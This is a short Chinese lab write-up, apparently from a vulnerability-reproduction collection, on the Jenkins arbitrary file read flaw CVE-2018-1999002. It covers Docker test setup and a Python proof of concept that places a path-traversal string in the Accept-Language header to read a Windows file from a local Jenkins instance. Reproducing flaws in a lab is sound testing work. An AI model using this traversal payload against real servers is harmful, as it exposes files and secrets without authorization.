# Jenkins 任意文件读取漏洞（CVE-2018-1999002）

## 原理

参考阅读 https://xz.aliyun.com/t/2486

## 测试环境搭建

测试环境编译及运行：

```
docker-compose build
docker-compose up -d
```

首次运行时会要求填写初始密码，密码会在控制台中输出。

安装完成后，在 `系统管理->全局安全配置` 下设置 `匿名用户具有可读权限`。

在开启匿名用户的可读权限后，该漏洞在Windows环境下可任意读取文件。

注意测试用的插件目录需要为已经安装的插件。

## 测试过程

```python
import requests

headers = {
    'Accept-Language': '/../../../../../../../../../../../Windows/win'
}

print(requests.get('http://127.0.0.1:8080/plugin/display-url-api/.ini', headers=headers).text)
```

读取配置文件：

![](1.png)
